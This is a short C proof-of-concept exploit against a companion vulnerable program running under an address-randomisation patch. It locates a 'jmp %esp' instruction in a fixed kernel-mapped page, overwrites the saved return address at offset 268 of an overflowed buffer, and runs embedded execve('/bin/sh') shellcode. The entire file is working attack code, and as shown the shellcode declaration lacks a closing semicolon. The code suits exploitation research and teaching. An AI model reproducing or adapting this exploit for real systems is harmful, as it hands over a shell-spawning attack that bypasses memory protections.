/*
 * va-exploit-poc.c, Exploiting va-vuln-poc.c 
 * under VA patch (Proof of Concept!)
 * - izik@tty64.org
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

char shellcode[] = 
  "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
  "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
  "\x80\xe8\xdc\xff\xff\xff/bin/sh"

unsigned long find_esp(void) {
        int i;
        char *ptr = (char *) 0xffffe000;

        for (i = 0; i < 4095; i++) {

                if (ptr[i] == '\xff' && ptr[i+1] == '\xe4') {
			printf("* Found JMP %%ESP @ 0x%08x\n", ptr+i);
			return (unsigned long) ptr+i;
                }
        }

	return 0;
}

int main(int argc, char **argv) {
	char evilbuf[295];
	char *evilargs[] = { "./va-vuln-poc", evilbuf , NULL };
	unsigned long retaddr;

	retaddr = find_esp();

	if (!retaddr) {
		printf("* No JMP %%ESP in this kernel!\n");
		return -1;
	}

	memset(evilbuf, 0x41, sizeof(evilbuf));

	memcpy(evilbuf+268, &retaddr, sizeof(long));

	memcpy(evilbuf+272, shellcode, sizeof(shellcode));

	execve("./va-vuln-poc", evilargs, NULL);

	return 1;
}

